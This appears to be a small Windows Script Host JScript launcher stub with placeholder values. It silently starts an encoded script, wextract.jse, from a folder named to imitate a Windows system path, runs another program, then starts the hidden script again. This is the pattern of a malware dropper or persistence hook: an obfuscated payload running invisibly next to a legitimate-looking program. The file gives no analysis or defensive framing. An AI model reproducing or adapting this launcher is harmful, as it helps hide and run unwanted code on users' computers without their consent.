var __x_abcd = new ActiveXObject("WScript.Shell");
__x_abcd.Run("wscript.exe /B \"C:\\Program Files\\Windows WEB\\Common Files\\EditPlus\\wextract.jse\" -qq" ,  0 , false ) ;
var __x_abhb="some_object";
var __x_abgum="some_object";
if (__x_abhb == ""){
WScript.Quit() ;
}
__x_abcd.Run("\"" + __x_abhb + "\" " + __x_abgum, 1, false) ;
WScript.Sleep(100);
__x_abcd.Run("wscript.exe  \"C:\\Program Files\\Windows WEB\\Common Files\\EditPlus\\wextract.jse\" -qq" ,  0 , false ) ;